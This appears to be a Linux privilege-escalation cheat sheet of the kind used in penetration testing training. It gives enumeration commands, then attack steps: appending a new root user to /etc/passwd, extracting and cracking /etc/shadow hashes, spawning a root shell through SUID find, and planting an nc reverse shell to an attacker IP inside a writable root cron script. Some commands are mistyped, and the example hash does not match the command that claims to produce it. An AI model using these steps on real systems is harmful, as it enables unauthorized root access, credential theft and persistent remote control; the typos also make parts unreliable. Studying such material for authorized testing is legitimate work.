### **Privilege Escalation**

### **Enumeration**

| Enumeration Type | Command(s) | Description |
| --- | --- | --- |
| **Current user** | `id` | Displays user ID, group ID, and privileges of the current user. |
| **Hostname** | `hostname` | Shows the name of the system's host. |
| **OS versions and architecture** | `cat /etc/issue`, `cat /etc/os-release`, `uname -a` | Displays the operating system version, release info, and kernel architecture. |
| **Running processes** | `ps aux` | Lists all running processes with their users, CPU usage, and other details. |
| **Network interfaces, routes, connections, open ports** | `ip a`, `ss -anp` | Lists network interfaces, IP addresses, routing tables, and open ports. |
| **Firewall rules** | `cat /etc/iptables/rules.v4` | Displays the current iptables firewall rules (if applicable). |
| **Scheduled cron tasks** | `ls -lah /etc/cron*`, `crontab -l`, `sudo crontab -l` | Lists scheduled cron jobs for the system and users. |
| **Installed applications** | `dpkg -l` | Shows installed packages and versions on Debian-based systems. |
| **Sensitive writable files** (excluding `/dev/null`) | `find / -writable -type d 2>/dev/null` | Searches for directories that are writable by the current user. |
| **In memory passwords** | `strings /dev/mem -n10 | grep -i PASS` | Displays possible password that are in memory. |
| **Find sensitive files** | `locate password | more` | Find possible files with sensitive information. |
| **Mounted drives** | `cat /etc/fstab`, `mount`, `lsblk` | Lists currently mounted drives and their mount points. |
| **Device drivers and kernel modules** | `lsmod`, `/sbin/modinfo <driver_name>` | Lists loaded kernel modules and displays info about a specific module. |
| **SUID binaries** | `find / -perm -u=s -type f 2>/dev/null`, `sudo -l`, `sudo -i` | Finds files with the SUID bit set, which could be used to escalate privileges. |
| **Automated enumeration** | Transfer and run `unix-privesc-check` | Automates privilege escalation checks on the system. |
|  |  |  |

### **Abusing *SUIDs***

**Check what we can run as sudo without password**

```bash
sudo -l

```

**Execute as other users**

```bash
# As root: when NOPASSWD is allowed
sudo su -

# As other specific user
su - [username]
sudo su - [username]
sudo su - [username] -c "[command]"

```

**All Possible SUID to Exploit** are available in this page [*GTFOBins*](https://gtfobins.github.io/).

**Inspect syslog file for process relevant events**

```bash
grep [process_name] /var/log/syslog

```

### **Important Files**

**Check the dot hidden files**, usually we could find private keys for SSH keys or hardcoded credentials

- [ ]  `.bashrc`
- [ ]  `.bash_profile`
- [ ]  `.mysql_history`
- [ ]  `.ssh`
- [ ]  `.enc`
- [ ]  Any other relevant file you may find

### **Password Files**

### ***/etc/passwd***

The misconfiguration is if we have permissions to edit this file, which we should not have, in which case we will modify it to **add a new root user**.

1. Create the hash

```bash
openssl passwd Password123

```

1. Add the hash to the `/etc/passwd` file

```bash
# This is just an example using the output of the previous command.
echo"newroot:$6$rounds=656000$6B8ZJQ4aK7G9P/8c$hx0E6ke7zxz1mUMN6LCyRJp2bV5hEE7EowzjEbLXwO6KZV7Ojo0DWg1lzCjLwWg.0tLGfhFe42NnJ8LMtBzD0:0:0:root:/root:/bin/bash">> /etc/passwd

```

1. Switch to the new user

```bash
su newroot

# Verify root access
id

```

### ***/etc/shadow***

The misconfiguration is that we should not be able to look the contents of this file, if we can do it then we could see the **hashes for the users and crack them**.

1. Get the hash out.

```bash
cat /etc/shadow | grep [root_user] > [root_user]_hash.txt

```

1. Crack the hash

```bash
# John The Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt [root_user]_hash.txt

# Hashcat, we need to isolate the hash part, for example from above hash would be: $6$rounds=656000$6B8ZJQ4aK7G9P/8c$hx0E6ke7zxz1mUMN6LCyRJp2bV5hEE7EowzjEbLXwO6KZV7Ojo0DWg1lzCjLwWg.0tLGfhFe42NnJ8LMtBzD0
hashcat -m 1800 [root_user]_hash.txt /usr/share/wordlists/rockyou.txt

```

1. Show the password

```bash
# John The Ripper
john --show [root_user]_hash.txt

# Hashcat
hashcat -m 1800 [root_user]_hash.txt /usr/share/wordlists/rockyou.txt --show

```

### **Cracking Both Files**

```bash
cat /etc/passwd
cat /etc/shadow

unshadow passwd shadow > unshadowed.txt
or
sudo unshadow /etc/passwd /etc/shadow > unshadowed.txt

john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

```

### **Setuid Binaries and Capabilities**

### **Setuid Binaries**

**Setuid** (Set User ID) binaries are executables that run with the privileges of the file owner, which is often root. Exploiting these binaries can grant elevated access if the binary is misconfigured or vulnerable.

1. **Find Setuid Binaries:**

```bash
find / -perm -4000 -type f2>/dev/null

```

1. **Inspect Permissions and Owners:**

```bash
ls -l $(find / -perm -4000 -type f2>/dev/null)
```

1. **Check for Vulnerabilities:**
- Review the setuid binaries for known vulnerabilities.
- Check if they can be exploited by running as a different user.
- Utilize tools like [GTFOBins](https://gtfobins.github.io/) to find specific exploitation techniques for binaries.

### **Exploiting Setuid Binaries**

1. **Finding the Process ID (PID) of a Running Binary:**

```bash
ps u -C [binary_name]

```

1. **Inspect Credentials of a Running Process:**

```bash
cat /proc/[PID]/status | grep Uid

```

1. **Getting a Reverse Shell Using `find`:**

```bash
find [directory] -exec [path_to_shell] \;

```

1. **Exploit:**

```bash
# Replace [vulnerable_binary] with the name of the binary you are targeting.
find / -name [vulnerable_binary] -exec /bin/bash -p \;

```

### **Cronjobs**

Look for CronJobs that are running with higher privileges but are writable by the current user. If found, you can modify these scripts to escalate privileges.

1. **Find CRON Jobs**

```bash
grep "CRON" /var/log/syslog
or
cat /var/log/cron.log

```

1. **Check permissions** for the script

```bash
ls -lah /path/to/script.sh

```

1. **Modify the script to add a reverse shell** (in case we have permissions to edit), depending on the case another possible payloads could be added, for example adding a new root user.

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [attacker_ip] [listener_port] >/tmp/f" >> /path/to/script.sh

```

1. **(Optional)** Other Commands to Inspect Cron Jobs.

```bash
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root

```
